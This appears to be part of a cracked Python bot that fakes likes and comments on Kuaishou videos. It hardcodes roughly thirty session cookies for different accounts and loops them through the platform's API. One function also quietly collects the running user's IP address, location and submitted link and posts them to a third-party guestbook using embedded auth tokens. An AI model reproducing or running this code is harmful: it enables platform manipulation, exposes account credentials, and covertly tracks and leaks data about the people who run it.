    Cookie24 = "userId=1535310392; kuaishou.server.web_st=ChZrdWFpc2hvdS5zZXJ2ZXIud2ViLnN0EqABa3ILJJNhMF9TRR_kzAfb1oimd-KAz4efJcf9EBD8aBz5iM-H9zWP0GNqrbHWxDQV7_-K740cvAeSXU5tm_4bjIeWnSNlBkVi2ZkjY1aMcnB5xDjZZVqfGThNqgkMbodVRwGtlLmvzi_Rh1bqnYYXf3s56aWeLqolja4_Xnow0gffwIr32x1yXSe9kq1o0LQMdG97YG2_uSpgKPfAas7FaxoStVKEb-xUGkLo9u0A7O3lj4AGIiCEiCOIyjKEQwEJvLxkGtlXqzvJt3JnObN6x9x4-LvN7ygFMAE; kuaishou.server.web_ph=_ph;"
    Cookie25 = "userId=4089174725; kuaishou.server.web_st=ChZrdWFpc2hvdS5zZXJ2ZXIud2ViLnN0ErAByym4X0CyrF45tdxc1EV038k2ZX4tmmgQAm9j1FJP_2CF8M5v6mR31MX42XxPxSKpStxUk0h_RFFGGbnIRnlCrzPipmZN-fa4Bspu4NOn59cO_oqtUMvsVZVr6JyCNwGFKTym2io4TuE0UIRoCfqq5JuLiQc_nIohIsi_UcYU8p4ybuLCHZq4JFtIzX9DkerTbZ8MtP5CnNq5-_6xEernSBB8MLQE7_7lkakjf6bI7IsaEujTAK8psfRFgJO5fm4wzVGofiIgtGNgUTHilv0hIc6BGTWWvG4MuouZKbxK_tkDbDjDc4EoBTAB; kuaishou.server.web_ph=_ph;"
    Cookie26 = "userId=3997667609; kuaishou.server.web_st=ChZrdWFpc2hvdS5zZXJ2ZXIud2ViLnN0EqABphzV6AqxPZ0hQ7Ep6X6OtGrQSIDkbeSgNIgSJ8O5hH7AL06ViNFlmBFLJX2-DuTVEZNz7bEmd3eM_oj4OYk4-hZk6mSMfsvcB9Sa3vIXiZek7czRbXiAwSO2zSzAPZIMGRsnZTjHPPl9VRm82xjFqmnGHZCFOs7PZMnc8aZFXQ_vdyYWglkNKQg4kyh24Ym1kVttsxqo0XRwRG8-1pusyhoSdWlbobCW6oJxuQLJTUr9oj_uIiD4iMqohMYTmCO4KHHLw_koheiVoKRy0K10RS0hAFh-UygFMAE; kuaishou.server.web_ph=_ph;"
    Cookie27 = "userId=1512474036; kuaishou.server.web_st=ChZrdWFpc2hvdS5zZXJ2ZXIud2ViLnN0EqABXDddqCwqIdnKaSvjee3_TtN2vbFH5TbVLN5aS-6jNbOB2D_tj1vZcvEXw6-SNMadhwTtQGjfM6cVFxM_b7geYLXx4Fil836QOtMlqN9MBjKMplhxg-gyJCvGlouEaez122WbmCAxgahxsx1IOD_xr-LRc6x8HbAAOvbB3nuHWiMOcEeaSBShmC-BZpBdy1-87XudfgpqKdxBKzlNYuzQ2xoStEyT9S95saEmiR8Dg-bb1DKRIiAq06W4p-Qo-f2ti-ZUI1WbwqAeX7RfXzqQD9mvI6rKgygFMAE; kuaishou.server.web_ph=_ph;"
    Cookie28 = "userId=3420007507; kuaishou.server.web_st=ChZrdWFpc2hvdS5zZXJ2ZXIud2ViLnN0ErABedMqxu2u1IfELGQSQ7bjrZsoxPtpnrBGPbQlP642wOXxknUqal7hLHEjOwSHOwodVxCPAmFUtSHK3Rpjn0S2hxP5dQMlC-ACqWqNAzQw1EJNaxHnRG9mgqDww8clacCnyPD5wAuDEttNu-xvniP-rMF4-FBiah2xdf6s0nwrUV6LrLPUGYOX9j0RLAL5k26756Sp8xVqrOqDVKtwv_uYVqcIOSgxlSA7djf2PK7P1ZEaEj4nNzgwOXQtT4rFS4DHn2889CIgb-WYJN1U1ImDyZTcIf82HkE20N3uzXlQdBD9WWaD42woBTAB; kuaishou.server.web_ph=_ph;"
    Cookie29 = "userId=4242015387; kuaishou.server.web_st=ChZrdWFpc2hvdS5zZXJ2ZXIud2ViLnN0EqAB-hoGjCk2_XkwQIQJuhc0ARYB-Akw0xZ3rI9TI8b7NLHu83Qmb9AZotBZU7u-gwogvHC8uoenqxVq0y02O34DfpfmF2ZfxpC9zr7auRs4cOUOFa4T2DEaeyDtYr0E_Rc-_jv-YSfhaJijsxAIytC851thTVBfP02ONmwg_iCkFLdvbWl4cOtVeWxaLtOIvW-SHjX1LJRta_aUNo3gkR-9tBoS-1Rj5-IBBNoxoIePYcxZFs4oIiDpZncezXz4ja4sFNlRAGaY__MVmQiQ4eJigTQf5RufJCgFMAE; kuaishou.server.web_ph=_ph;"
    Cookie30 = "userId=1512474036; kuaishou.server.web_st=ChZrdWFpc2hvdS5zZXJ2ZXIud2ViLnN0ErAB9TxXqBrFJU3j1sdIUAVttHUh2ksskJjcj06QzMcvl9KSbXN6rz_WNGF3fVtn1EQUJhkxRJ1ncBILC10Jyv31cZ4FdDu0SGfI1_OFjyS9h1KnhO33y1nXBox9w1dISp2QUP-ltGo5oySogv-vQ9Wgp7PvJXOht-PKqnJxSJ3iZEhaKCsy2JA_DMMKwkcMMmuIZXqegioPabaOnpCj6OStWtuS5zklrMkTu3wnrJ_sn9caErg3K5cJq-gD4V33WawTubqNBSIgEjtml6Nvc10daUOkKS1VSvnq7Q5XZuRfnQ4rvZoUyt0oBTAB; kuaishou.server.web_ph=_ph;"

    headers1 = {
        'User-Agent': "Mozilla/5.0 (iPad; U; CPU OS 6_0 like Mac OS X; zh-CN; iPad2)",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "identity",
        'accept-language': "zh-CN",
        'Charsert': "utf-8",
        'Content-Type': "application/json; charset=utf-8",
        'Cookie': Cookie1
    }

    headers2 = {
        'User-Agent': "Mozilla/5.0 (iPad; U; CPU OS 6_0 like Mac OS X; zh-CN; iPad2)",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "identity",
        'accept-language': "zh-CN",
        'Charsert': "utf-8",
        'Content-Type': "application/json; charset=utf-8",
        'Cookie': Cookie2
    }

    headers3 = {
        'User-Agent': "Mozilla/5.0 (iPad; U; CPU OS 6_0 like Mac OS X; zh-CN; iPad2)",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "identity",
        'accept-language': "zh-CN",
        'Charsert': "utf-8",
        'Content-Type': "application/json; charset=utf-8",
        'Cookie': Cookie3
    }

    headers4 = {
        'User-Agent': "Mozilla/5.0 (iPad; U; CPU OS 6_0 like Mac OS X; zh-CN; iPad2)",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "identity",
        'accept-language': "zh-CN",
        'Charsert': "utf-8",
        'Content-Type': "application/json; charset=utf-8",
        'Cookie': Cookie4
    }

    headers5 = {
        'User-Agent': "Mozilla/5.0 (iPad; U; CPU OS 6_0 like Mac OS X; zh-CN; iPad2)",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "identity",
        'accept-language': "zh-CN",
        'Charsert': "utf-8",
        'Content-Type': "application/json; charset=utf-8",
        'Cookie': Cookie5
    }

    headers6 = {
        'User-Agent': "Mozilla/5.0 (iPad; U; CPU OS 6_0 like Mac OS X; zh-CN; iPad2)",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "identity",
        'accept-language': "zh-CN",
        'Charsert': "utf-8",
        'Content-Type': "application/json; charset=utf-8",
        'Cookie': Cookie6
    }

    headers7 = {
        'User-Agent': "Mozilla/5.0 (iPad; U; CPU OS 6_0 like Mac OS X; zh-CN; iPad2)",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "identity",
        'accept-language': "zh-CN",
        'Charsert': "utf-8",
        'Content-Type': "application/json; charset=utf-8",
        'Cookie': Cookie7
    }

    headers8 = {
        'User-Agent': "Mozilla/5.0 (iPad; U; CPU OS 6_0 like Mac OS X; zh-CN; iPad2)",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "identity",
        'accept-language': "zh-CN",
        'Charsert': "utf-8",
        'Content-Type': "application/json; charset=utf-8",
        'Cookie': Cookie8
    }
    headers9 = {
        'User-Agent': "Mozilla/5.0 (iPad; U; CPU OS 6_0 like Mac OS X; zh-CN; iPad2)",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "identity",
        'accept-language': "zh-CN",
        'Charsert': "utf-8",
        'Content-Type': "application/json; charset=utf-8",
        'Cookie': Cookie9
    }
    headers10 = {
        'User-Agent': "Mozilla/5.0 (iPad; U; CPU OS 6_0 like Mac OS X; zh-CN; iPad2)",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "identity",
        'accept-language': "zh-CN",
        'Charsert': "utf-8",
        'Content-Type': "application/json; charset=utf-8",
        'Cookie': Cookie10
    }
    headers11 = {
        'User-Agent': "Mozilla/5.0 (iPad; U; CPU OS 6_0 like Mac OS X; zh-CN; iPad2)",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "identity",
        'accept-language': "zh-CN",
        'Charsert': "utf-8",
        'Content-Type': "application/json; charset=utf-8",
        'Cookie': Cookie11
    }
    headers12 = {
        'User-Agent': "Mozilla/5.0 (iPad; U; CPU OS 6_0 like Mac OS X; zh-CN; iPad2)",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "identity",
        'accept-language': "zh-CN",
        'Charsert': "utf-8",
        'Content-Type': "application/json; charset=utf-8",
        'Cookie': Cookie12
    }
    headers13 = {
        'User-Agent': "Mozilla/5.0 (iPad; U; CPU OS 6_0 like Mac OS X; zh-CN; iPad2)",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "identity",
        'accept-language': "zh-CN",
        'Charsert': "utf-8",
        'Content-Type': "application/json; charset=utf-8",
        'Cookie': Cookie13
    }
    headers14 = {
        'User-Agent': "Mozilla/5.0 (iPad; U; CPU OS 6_0 like Mac OS X; zh-CN; iPad2)",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "identity",
        'accept-language': "zh-CN",
        'Charsert': "utf-8",
        'Content-Type': "application/json; charset=utf-8",
        'Cookie': Cookie14
    }
    headers15 = {
        'User-Agent': "Mozilla/5.0 (iPad; U; CPU OS 6_0 like Mac OS X; zh-CN; iPad2)",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "identity",
        'accept-language': "zh-CN",
        'Charsert': "utf-8",
        'Content-Type': "application/json; charset=utf-8",
        'Cookie': Cookie15
    }
    headers16 = {
        'User-Agent': "Mozilla/5.0 (iPad; U; CPU OS 6_0 like Mac OS X; zh-CN; iPad2)",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "identity",
        'accept-language': "zh-CN",
        'Charsert': "utf-8",
        'Content-Type': "application/json; charset=utf-8",
        'Cookie': Cookie16
    }
    headers17 = {
        'User-Agent': "Mozilla/5.0 (iPad; U; CPU OS 6_0 like Mac OS X; zh-CN; iPad2)",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "identity",
        'accept-language': "zh-CN",
        'Charsert': "utf-8",
        'Content-Type': "application/json; charset=utf-8",
        'Cookie': Cookie17
    }
    headers18 = {
        'User-Agent': "Mozilla/5.0 (iPad; U; CPU OS 6_0 like Mac OS X; zh-CN; iPad2)",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "identity",
        'accept-language': "zh-CN",
        'Charsert': "utf-8",
        'Content-Type': "application/json; charset=utf-8",
        'Cookie': Cookie18
    }
    headers19 = {
        'User-Agent': "Mozilla/5.0 (iPad; U; CPU OS 6_0 like Mac OS X; zh-CN; iPad2)",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "identity",
        'accept-language': "zh-CN",
        'Charsert': "utf-8",
        'Content-Type': "application/json; charset=utf-8",
        'Cookie': Cookie19
    }

    headers20 = {
        'User-Agent': "Mozilla/5.0 (iPad; U; CPU OS 6_0 like Mac OS X; zh-CN; iPad2)",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "identity",
        'accept-language': "zh-CN",
        'Charsert': "utf-8",
        'Content-Type': "application/json; charset=utf-8",
        'Cookie': Cookie20
    }
    headers21 = {
        'User-Agent': "Mozilla/5.0 (iPad; U; CPU OS 6_0 like Mac OS X; zh-CN; iPad2)",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "identity",
        'accept-language': "zh-CN",
        'Charsert': "utf-8",
        'Content-Type': "application/json; charset=utf-8",
        'Cookie': Cookie21
    }
    headers22 = {
        'User-Agent': "Mozilla/5.0 (iPad; U; CPU OS 6_0 like Mac OS X; zh-CN; iPad2)",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "identity",
        'accept-language': "zh-CN",
        'Charsert': "utf-8",
        'Content-Type': "application/json; charset=utf-8",
        'Cookie': Cookie22
    }
    headers23 = {
        'User-Agent': "Mozilla/5.0 (iPad; U; CPU OS 6_0 like Mac OS X; zh-CN; iPad2)",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "identity",
        'accept-language': "zh-CN",
        'Charsert': "utf-8",
        'Content-Type': "application/json; charset=utf-8",
        'Cookie': Cookie23
    }
    headers24 = {
        'User-Agent': "Mozilla/5.0 (iPad; U; CPU OS 6_0 like Mac OS X; zh-CN; iPad2)",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "identity",
        'accept-language': "zh-CN",
        'Charsert': "utf-8",
        'Content-Type': "application/json; charset=utf-8",
        'Cookie': Cookie24
    }
    headers25 = {
        'User-Agent': "Mozilla/5.0 (iPad; U; CPU OS 6_0 like Mac OS X; zh-CN; iPad2)",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "identity",
        'accept-language': "zh-CN",
        'Charsert': "utf-8",
        'Content-Type': "application/json; charset=utf-8",
        'Cookie': Cookie25
    }
    headers26 = {
        'User-Agent': "Mozilla/5.0 (iPad; U; CPU OS 6_0 like Mac OS X; zh-CN; iPad2)",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "identity",
        'accept-language': "zh-CN",
        'Charsert': "utf-8",
        'Content-Type': "application/json; charset=utf-8",
        'Cookie': Cookie26
    }

    headers27 = {
        'User-Agent': "Mozilla/5.0 (iPad; U; CPU OS 6_0 like Mac OS X; zh-CN; iPad2)",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "identity",
        'accept-language': "zh-CN",
        'Charsert': "utf-8",
        'Content-Type': "application/json; charset=utf-8",
        'Cookie': Cookie27
    }

    headers28 = {
        'User-Agent': "Mozilla/5.0 (iPad; U; CPU OS 6_0 like Mac OS X; zh-CN; iPad2)",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "identity",
        'accept-language': "zh-CN",
        'Charsert': "utf-8",
        'Content-Type': "application/json; charset=utf-8",
        'Cookie': Cookie28
    }
    headers29 = {
        'User-Agent': "Mozilla/5.0 (iPad; U; CPU OS 6_0 like Mac OS X; zh-CN; iPad2)",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "identity",
        'accept-language': "zh-CN",
        'Charsert': "utf-8",
        'Content-Type': "application/json; charset=utf-8",
        'Cookie': Cookie29
    }
    headers30 = {
        'User-Agent': "Mozilla/5.0 (iPad; U; CPU OS 6_0 like Mac OS X; zh-CN; iPad2)",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "identity",
        'accept-language': "zh-CN",
        'Charsert': "utf-8",
        'Content-Type': "application/json; charset=utf-8",
        'Cookie': Cookie30
    }

    yuluoyyds = '"result":1'

    response = requests.post(url, data=payload, headers=headers1)
    if yuluoyyds in response.text:
        print(green + '1' + redd, "评论成功，状态码：", response.status_code)
    else:
        print('1', red + '评论失败' + redd)
    response2 = requests.post(url, data=payload, headers=headers2)
    if yuluoyyds in response2.text:
        print(green + '2' + redd, "评论成功，状态码：", response.status_code)
    else:
        print('2', red + '评论失败' + redd)
    response3 = requests.post(url, data=payload, headers=headers3)
    if yuluoyyds in response3.text:
        print(green + '3' + redd, "评论成功，状态码：", response.status_code)
    else:
        print('3', red + '评论失败' + redd)
    response4 = requests.post(url, data=payload, headers=headers4)
    if yuluoyyds in response4.text:
        print(green + '4' + redd, "评论成功，状态码：", response.status_code)
    else:
        print('4', red + '评论失败' + redd)
    response5 = requests.post(url, data=payload, headers=headers5)
    if yuluoyyds in response5.text:
        print(green + '5' + redd, "评论成功，状态码：", response.status_code)
    else:
        print('5', red + '评论失败' + redd)
    response6 = requests.post(url, data=payload, headers=headers6)
    if yuluoyyds in response6.text:
        print(green + '6' + redd, "评论成功，状态码：", response.status_code)
    else:
        print('6', red + '评论失败' + redd)
    response7 = requests.post(url, data=payload, headers=headers7)
    if yuluoyyds in response7.text:
        print(green + '7' + redd, "评论成功，状态码：", response.status_code)
    else:
        print('7', red + '评论失败' + redd)
    response8 = requests.post(url, data=payload, headers=headers8)
    if yuluoyyds in response8.text:
        print(green + '8' + redd, "评论成功，状态码：", response.status_code)
    else:
        print('8', red + '评论失败' + redd)
    response9 = requests.post(url, data=payload, headers=headers9)
    if yuluoyyds in response9.text:
        print(green + '9' + redd, "评论成功，状态码：", response.status_code)
    else:
        print('9', red + '评论失败' + redd)
    response10 = requests.post(url, data=payload, headers=headers10)
    if yuluoyyds in response10.text:
        print(green + '10' + redd, "评论成功，状态码：", response.status_code)
    else:
        print('10', red + '评论失败' + redd)
    response11 = requests.post(url, data=payload, headers=headers11)
    if yuluoyyds in response11.text:
        print(green + '11' + redd, "评论成功，状态码：", response.status_code)
    else:
        print('11', red + '评论失败' + redd)
    response12 = requests.post(url, data=payload, headers=headers12)
    if yuluoyyds in response12.text:
        print(green + '12' + redd, "评论成功，状态码：", response.status_code)
    else:
        print('12', red + '评论失败' + redd)
    response13 = requests.post(url, data=payload, headers=headers13)
    if yuluoyyds in response13.text:
        print(green + '13' + redd, "评论成功，状态码：", response.status_code)
    else:
        print('13', red + '评论失败' + redd)
    response14 = requests.post(url, data=payload, headers=headers14)
    if yuluoyyds in response14.text:
        print(green + '14' + redd, "评论成功，状态码：", response.status_code)
    else:
        print('14', red + '评论失败' + redd)
    response15 = requests.post(url, data=payload, headers=headers15)
    if yuluoyyds in response15.text:
        print(green + '15' + redd, "评论成功，状态码：", response.status_code)
    else:
        print('15', red + '评论失败' + redd)
    response16 = requests.post(url, data=payload, headers=headers16)
    if yuluoyyds in response16.text:
        print(green + '16' + redd, "评论成功，状态码：", response.status_code)
    else:
        print('16', red + '评论失败' + redd)
    response17 = requests.post(url, data=payload, headers=headers17)
    if yuluoyyds in response17.text:
        print(green + '17' + redd, "评论成功，状态码：", response.status_code)
    else:
        print('17', red + '评论失败' + redd)
    response18 = requests.post(url, data=payload, headers=headers18)
    if yuluoyyds in response18.text:
        print(green + '18' + redd, "评论成功，状态码：", response.status_code)
    else:
        print('18', red + '评论失败' + redd)
    response19 = requests.post(url, data=payload, headers=headers19)
    if yuluoyyds in response19.text:
        print(green + '19' + redd, "评论成功，状态码：", response.status_code)
    else:
        print('19', red + '评论失败' + redd)
    response20 = requests.post(url, data=payload, headers=headers20)
    if yuluoyyds in response20.text:
        print(green + '20' + redd, "评论成功，状态码：", response.status_code)
    else:
        print('20', red + '评论失败' + redd)

    response21 = requests.post(url, data=payload, headers=headers21)
    if yuluoyyds in response21.text:
        print(green + '21' + redd, "评论成功，状态码：", response.status_code)
    else:
        print('21', red + '评论失败' + redd)

    response22 = requests.post(url, data=payload, headers=headers22)
    if yuluoyyds in response22.text:
        print(green + '22' + redd, "评论成功，状态码：", response.status_code)
    else:
        print('22', red + '评论失败' + redd)
    response23 = requests.post(url, data=payload, headers=headers23)
    if yuluoyyds in response23.text:
        print(green + '23' + redd, "评论成功，状态码：", response.status_code)
    else:
        print('23', red + '评论失败' + redd)
    response24 = requests.post(url, data=payload, headers=headers24)
    if yuluoyyds in response24.text:
        print(green + '24' + redd, "评论成功，状态码：", response.status_code)
    else:
        print('24', red + '评论失败' + redd)
    response25 = requests.post(url, data=payload, headers=headers25)
    if yuluoyyds in response25.text:
        print(green + '25' + redd, "评论成功，状态码：", response.status_code)
    else:
        print('25', red + '评论失败' + redd)

    response26 = requests.post(url, data=payload, headers=headers26)
    if yuluoyyds in response26.text:
        print(green + '26' + redd, "评论成功，状态码：", response.status_code)
    else:
        print('26', red + '评论失败' + redd)

    response27 = requests.post(url, data=payload, headers=headers27)
    if yuluoyyds in response27.text:
        print(green + '27' + redd, "评论成功，状态码：", response.status_code)
    else:
        print('27', red + '评论失败' + redd)
    response28 = requests.post(url, data=payload, headers=headers28)
    if yuluoyyds in response28.text:
        print(green + '28' + redd, "评论成功，状态码：", response.status_code)
    else:
        print('28', red + '评论失败' + redd)
    response29 = requests.post(url, data=payload, headers=headers29)
    if yuluoyyds in response29.text:
        print(green + '29' + redd, "评论成功，状态码：", response.status_code)
    else:
        print('29', red + '评论失败' + redd)
    response30 = requests.post(url, data=payload, headers=headers30)
    if yuluoyyds in response30.text:
        print(green + '30' + redd, "评论成功，状态码：", response.status_code)
    else:
        print('30', red + '评论失败' + redd)


def main_menu5():
    import requests
    import re
    import json
    import time
    import urllib.request
    import os
    bai = "\033[3m"
    hx = "\033[4m"
    red = "\033[31m"
    green = '\033[32m'
    redd = "\033[0m"
    print(
        green + '伏笔牛逼' + redd)

    time_tuple = time.localtime(time.time())
    A = "{}.{}.{}『{}:{}:{}』".format(time_tuple[0], time_tuple[1], time_tuple[2], time_tuple[3], time_tuple[4],
                                    time_tuple[5])

    page = requests.get('https://www.ipip.net/ip-js/')
    ss = (page.text)
    f = re.findall('[\u4e00-\u9fa5]', ss)
    f = ''.join([i for i in f if i != ' '])

    from urllib.parse import quote
    text = f
    encoded_text = quote(text)
    f = encoded_text
    ff = (f.replace('%E4%B8%AD%E5%9B%BD', '%5B%3A513%5D'))
    from urllib.parse import quote
    text1 = A
    encoded_text1 = quote(text1)
    A = encoded_text1

    urlc = "https://api.pearktrue.cn/api/hitokoto/"
    responsec = requests.get(urlc)
    print(responsec.text)
    page = requests.get('https://share.weiyun.com/183vf7EV')
    req = requests.get("http://txt.go.sohu.com/ip/soip")
    ip = re.findall('window.sohu_user_ip="(.*?)";', req.text)[0]
    if ip in page.text:
        print('你已被作者列入黑名单')
        exit()
    xzh = re.findall('接口数量【(.*?)】黑', page.text)  # 取值
    xzh = ''.join([i.strip('') for i in xzh])  # 去括号
    xzh = (red + xzh + redd)

    url66666 = "http://tool.pfan.cn/shorturl/restore"
    yul = input('输入作品链接：')
    yul = re.findall('https://v.kuaishou.com/(.*?) ', yul)  # 取值
    yul = ''.join([i.strip('') for i in yul])
    yul = 'https://v.kuaishou.com/' + yul
    if yul == "https://v.kuaishou.com/":
        print("输入的链接有误")
        print("提示:链接需要带文案")
        exit()
    print('链接为' + yul)
    from urllib.parse import quote
    text = yul
    encoded_text = quote(text)
    yull = encoded_text
    aaaaaaaa = 'shorturl='
    aaaaaaaaa = aaaaaaaa + yull
    payload66666 = aaaaaaaaa

    headers66666 = {
        'User-Agent': "Apache-HttpClient/UNAVAILABLE (java 1.4)",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "identity",
        'Content-Type': "application/x-www-form-urlencoded"
    }

    response66666 = requests.post(url66666, data=payload66666, headers=headers66666)
    a1 = response66666.text
    a111 = re.findall('&photoId=(.*?)&', a1)  # 取值
    a222 = re.findall('&userId=(.*?)&', a1)  # 取值
    a1111 = ''.join([i.strip('') for i in a111])  # 去括号
    a2222 = ''.join([i.strip('') for i in a222])  # 去括号
    print('作者ID：' + a2222)
    print('作品ID：' + a1111)

    url = "https://www.kuaishou.com/graphql"
    payload = json.dumps({
        "operationName": "visionVideoLike",
        "variables": {
            "photoId": a1111,
            "photoAuthorId": a2222
        },
        "query": "mutation visionVideoLike($photoId: String, $photoAuthorId: String, $cancel: Int, $expTag: String) {\n  visionVideoLike(photoId: $photoId, photoAuthorId: $photoAuthorId, cancel: $cancel, expTag: $expTag) {\n    result\n    __typename\n  }\n}\n"
    })

    urla = "https://mapi.yxhapi.com/user/sns/box/android/v3.0/guestBook-send.html"

    headersa = {
        'User-Agent': "4399GameCenter/8.5.0.14(android;PERM00;12;1080x2237;WIFI;2152.1033;yyys.3849)",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "gzip",
        'Content-Type': "application/x-www-form-urlencoded",
        'pauth': "3361448649%7C2234157995%7Ct3ce7n18014adbafaa96b1a00c7630c6%7C1726423874%7C10002%7C0f7a190f552694ecc8a8f3ba3b49abeb%7C2",
        'X-Yxh3': "gG.xNmMwNzk0NjY1YmE0ZN.Y",
        'mudid': "3asog2UMzP8ZhZIyB1oAB9fab",
        'zxaid': "A01-YWep7z5DqWqCuFFVRqiUu5LDd44IZcl7",
        'X-Yxh1': "gG.xNmMwNzk0NjY1YmE0ZN.Y",
        'SM-DEVICEID': "20240821151037a3634af90439cbc666c2aaa92f14ae1f019313897fbf46b1",
        'mauth': "f4eafd2406c13750f162bb2a14202fb1",
        'Mbox': "b%3DbmpONy",
        'mauthcode': "12690cd79|2c8e0d552d3f3b017edc9e4a0680fa7f|3361448649",
        'mareacode': "999999",
        'X-T': "DT0yNjQyNDQxM3w4OGY1fDcyNGE4MMcc"
    }

    from urllib.parse import quote

    payloada = f"gameId=&commentId=&reuid=&type=user&tid=3361448649&content={A}%0AIP%E5%9C%B0%E5%9D%80%EF%BC%9A{ip}%0A%E4%BD%8D%E7%BD%AE%EF%BC%9A{ff}%0A%E9%93%BE%E6%8E%A5%EF%BC%9A{yull}"
    responsea = requests.post(urla, data=payloada, headers=headersa)

    sent = 0
    with open("Cookie.txt", "r") as file:
        phone_numbers = file.readlines()
    import multiprocessing
    # 核验Cookie
    while phone_numbers:

        for sent in range(9999):
            Cookie = phone_numbers[0].strip()
            Cookie = Cookie.replace("ⅰ", "i")
            with open('Cookie.txt', 'r') as file:
                lines = file.readlines()
            num_lines = len(lines)
            zhsl = (red + str(num_lines) + redd)
            headers = {
                'User-Agent': "Mozilla/5.0 (iPad; U; CPU OS 6_0 like Mac OS X; zh-CN; iPad2)",
                'Connection': "Keep-Alive",
                'Accept-Encoding': "identity",
                'accept-language': "zh-CN",
                'Charsert': "utf-8",
                'Content-Type': "application/json; charset=utf-8",
                'Cookie': Cookie
            }
            yuluoyyds = '"result":1'
            response = requests.post(url, data=payload, headers=headers)
            id_found = yuluoyyds in response.text

            Cookie9999 = re.findall('userId=(.*?); kuaishou.server.web_st', Cookie)  # 取值
            Cookie99999 = (('账号') + (red + str(Cookie9999) + redd))
            if id_found:
                print((sent), (Cookie99999), (green + "：✔点赞成功") + redd, ("接口剩余"), (zhsl))
            else:
                print((sent), (Cookie99999), (red + "：❌点赞失败") + redd, ("接口剩余"), (zhsl))
            del phone_numbers[0]
            with open("Cookie.txt", "w") as file:
                for phone in phone_numbers:
                    file.write(phone)
            processes = []
            for _ in range(1):
                p = multiprocessing.Process()
                processes.append(p)
                p.start()

                # 等待所有进程完成
            for p in processes:
                p.join()


def main_menu6():
    import requests
    import re
    import json
    import requests
    import hashlib
    import json
    import time
    import random
    import datetime
    import webbrowser
    import urllib.request
    import re
    import os
    import time
    bai = "\033[3m"
    hx = "\033[4m"
    red = "\033[31m"
    green = '\033[32m'
    redd = "\033[0m"
    print(
        green + '伏笔大爹都给你破解了 快去用付费版本' + redd)
    print('须知:毕竟是公益，使用人数多接口容易坏很正常')

    page = requests.get('https://share.weiyun.com/183vf7EV')
    req = requests.get("http://txt.go.sohu.com/ip/soip")
    ip = re.findall('window.sohu_user_ip="(.*?)";', req.text)[0]
    if ip in page.text:
        print('你已被作者列入黑名单')
        exit()
    url66666 = "http://tool.pfan.cn/shorturl/restore"
    yul = input('输入作品链接：')
    yul = re.findall('https://v.kuaishou.com/(.*?) ', yul)  # 取值
    yul = ''.join([i.strip('') for i in yul])
    yul = 'https://v.kuaishou.com/' + yul
    if yul == "https://v.kuaishou.com/":
        print("输入的链接有误")
        print("提示:链接需要带文案")
        exit()
    print('链接为' + yul)
    from urllib.parse import quote
    text = yul
    encoded_text = quote(text)
    yull = encoded_text
    aaaaaaaa = 'shorturl='
    aaaaaaaaa = aaaaaaaa + yull
    payload66666 = aaaaaaaaa

    headers66666 = {
        'User-Agent': "Apache-HttpClient/UNAVAILABLE (java 1.4)",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "identity",
        'Content-Type': "application/x-www-form-urlencoded"
    }

    response66666 = requests.post(url66666, data=payload66666, headers=headers66666)
    a1 = response66666.text
    a111 = re.findall('&photoId=(.*?)&', a1)  # 取值
    a222 = re.findall('&userId=(.*?)&', a1)  # 取值
    a1111 = ''.join([i.strip('') for i in a111])  # 去括号
    a2222 = ''.join([i.strip('') for i in a222])  # 去括号
    print('作者ID：' + a1111)
    print('作品ID：' + a2222)

    url = "https://www.kuaishou.com/graphql"

    payload = json.dumps({
        "operationName": "visionVideoLike",
        "variables": {
            "photoId": a1111,
            "photoAuthorId": a2222
        },
        "query": "mutation visionVideoLike($photoId: String, $photoAuthorId: String, $cancel: Int, $expTag: String) {\n  visionVideoLike(photoId: $photoId, photoAuthorId: $photoAuthorId, cancel: $cancel, expTag: $expTag) {\n    result\n    __typename\n  }\n}\n"
    })

    Cookie1 = "userId=876996449; kuaishou.server.web_st=ChZrdWFpc2hvdS5zZXJ2ZXIud2ViLnN0ErABch-fUkCW34GZOa1SQshc5esY1-UonLI0UOWKNoW4WH7tVqN4iBWtM8is1ASzYqDz_UBzbzyxjEKkfvEphR7g0GhLzct-fbV5iJc2G1fkWnDgS-rkg0Pb9L3S9BEHJwAYzwjjrOljOFwuQvxkELb6XAk30y0m1P5qkppq8Hu5BLMOmUTqQjGpua2x3OMfV5qy99RYwPzsOge8IYjOlBWopgPuqU9FyM9XxuvP1LLKdHUaEnEnr_pVE1EETN0H1SIhhhqWtSIgKu-lcxLZV7K-b6h7EGe-MGVV46JxZPFDw1F9TfE_uFooBTAB; kuaishou.server.web_ph=_ph;"
